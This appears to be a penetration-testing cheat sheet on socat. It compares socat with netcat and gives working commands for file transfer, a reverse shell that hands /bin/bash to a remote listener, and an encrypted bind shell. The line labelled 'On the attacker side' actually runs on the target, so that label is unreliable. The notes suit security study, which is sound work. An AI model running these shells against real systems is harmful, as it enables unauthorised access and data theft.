---
title: SOCAT
author: i4
date: M01-09-2023
---

## Description
Socat is a command-line utility that establishes two bidirectional byte streams and transfers data between them. For penetration testing, it is similar to Netcat but has additional useful features.

## Difference to nc


.CLIENT

```
$ nc <remote server's ip address> 80
$ socat - TCP4:<remote server's ip address>:80
```

.SERVER

```
$ sudo nc -lvp localhost 443
$ sudo socat TCP4-LISTEN:443 STDOUT
```

## File transfer

```
$ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt

# Grabbing the file from a client
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
```


## Reverse Shell

- `-d` increases verbosity

```
socat -d -d TCP4-LISTEN:443 STDOUT
```


On the attacker side:
```
socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```


## Encrypted bind shell

1. Create a new key pair
```
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
```
2. Concat private and public
```
cat bind_shell.key bind_shell.crt > bind_shell.pem
```
3. Run bind shell
```
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```
4. Connect to listening bind shell
```
socat - OPENSSL:10.11.0.4:443,verify=0
```

